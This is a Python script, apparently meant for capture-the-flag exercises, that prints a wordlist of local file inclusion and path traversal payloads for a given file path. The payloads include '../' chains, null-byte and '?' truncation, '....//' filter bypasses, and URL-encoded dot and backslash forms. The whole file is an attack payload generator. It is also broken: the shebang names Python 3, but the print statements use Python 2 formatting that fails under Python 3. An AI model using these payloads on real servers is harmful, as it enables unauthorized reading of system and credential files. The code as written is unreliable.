#!/usr/bin/env python3
# simple LFI wordlist generator for basic CTFs
import sys

f = sys.argv[1]

print ("%s") % f 
print ("..%s") % f
print ("../..%s") % f
print ("../../..%s") % f
print ("../../../..%s") % f
print ("../../../../..%s") % f
print ("../../../../../..%s") % f
print ("../../../../../../..%s") % f
print ("../../../../../../../..%s") % f
print ("../../../../../../../../..%s") % f
print ("%s%%00") % f
print ("..%s%%00") % f
print ("../..%s%%00") % f
print ("../../..%s%%00") % f
print ("../../../..%s%%00") % f
print ("../../../../..%s%%00") % f 
print ("../../../../../..%s%%00") % f 
print ("../../../../../../..%s%%00") % f 
print ("../../../../../../../..%s%%00") % f 
print ("../../../../../../../../..%s%%00") % f 
print ("%s?") % f
print ("..%s?") % f
print ("../..%s?") % f
print ("../../..%s?") % f
print ("../../../..%s?") % f
print ("../../../../..%s?") % f
print ("../../../../../..%s?") % f
print ("../../../../../../..%s?") % f
print ("../../../../../../../..%s?") % f
print ("../../../../../../../../..%s?") % f
print ("..../%s") % f
print ("....//..../%s") % f
print ("....//....//..../%s") % f
print ("....//....//....//..../%s") % f
print ("....//....//....//....//..../%s") % f
print ("....//....//....//....//....//..../%s") % f
print ("....//....//....//....//....//....//..../%s") % f
print ("....//....//....//....//....//....//....//..../%s") % f
print ("....//....//....//....//....//....//....//....//..../%s") % f
print ("....//....//....//....//....//....//....//....//....//..../%s") % f
print ("/%%5C..%s") % f
print ("/%%5C../%%5C..%s") % f
print ("/%%5C../%%5C../%%5C..%s") % f
print ("/%%5C../%%5C../%%5C../%%5C..%s") % f
print ("/%%5C../%%5C../%%5C../%%5C../%%5C..%s") % f
print ("/%%5C../%%5C../%%5C../%%5C../%%5C../%%5C..%s") % f
print ("/%%5C../%%5C../%%5C../%%5C../%%5C../%%5C../%%5C..%s") % f
print ("/%%5C../%%5C../%%5C../%%5C../%%5C../%%5C../%%5C../%%5C..%s") % f
print ("/%%5C../%%5C../%%5C../%%5C../%%5C../%%5C../%%5C../%%5C../%%5C..%s") % f
print ("/%%5C../%%5C../%%5C../%%5C../%%5C../%%5C../%%5C../%%5C../%%5C../%%5C..%s") % f
print ("%%2e%%2e%s") % f
print ("%%2e%%2e/%%2e%%2e%s") % f
print ("%%2e%%2e/%%2e%%2e/%%2e%%2e%s") % f
print ("%%2e%%2e/%%2e%%2e/%%2e%%2e/%%2e%%2e%s") % f
print ("%%2e%%2e/%%2e%%2e/%%2e%%2e/%%2e%%2e/%%2e%%2e%s") % f
print ("%%2e%%2e/%%2e%%2e/%%2e%%2e/%%2e%%2e/%%2e%%2e/%%2e%%2e%s") % f
print ("%%2e%%2e/%%2e%%2e/%%2e%%2e/%%2e%%2e/%%2e%%2e/%%2e%%2e/%%2e%%2e%s") % f
print ("%%2e%%2e/%%2e%%2e/%%2e%%2e/%%2e%%2e/%%2e%%2e/%%2e%%2e/%%2e%%2e/%%2e%%2e%s") % f
print ("%%2e%%2e/%%2e%%2e/%%2e%%2e/%%2e%%2e/%%2e%%2e/%%2e%%2e/%%2e%%2e/%%2e%%2e/%%2e%%2e%s") % f
print ("%%2e%%2e/%%2e%%2e/%%2e%%2e/%%2e%%2e/%%2e%%2e/%%2e%%2e/%%2e%%2e/%%2e%%2e/%%2e%%2e/%%2e%%2e%s") % f
